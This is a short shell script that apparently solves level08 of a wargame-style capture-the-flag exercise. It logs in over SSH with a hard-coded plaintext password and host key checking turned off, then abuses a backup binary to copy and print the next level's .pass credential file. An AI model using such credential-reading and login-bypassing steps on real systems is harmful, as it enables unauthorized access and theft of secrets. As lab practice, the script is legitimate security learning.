#!/bin/sh

PASS='7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC'
echo $PASS
echo $OVERRIDE

sshpass -p $PASS ssh -o StrictHostKeyChecking=no level08@$OVERRIDE -p 4242 << EOF
cd /tmp
mkdir -p backups/home/users/level09
~/./level08 /home/users/level09/.pass
cat backups//home/users/level09/.pass 
EOF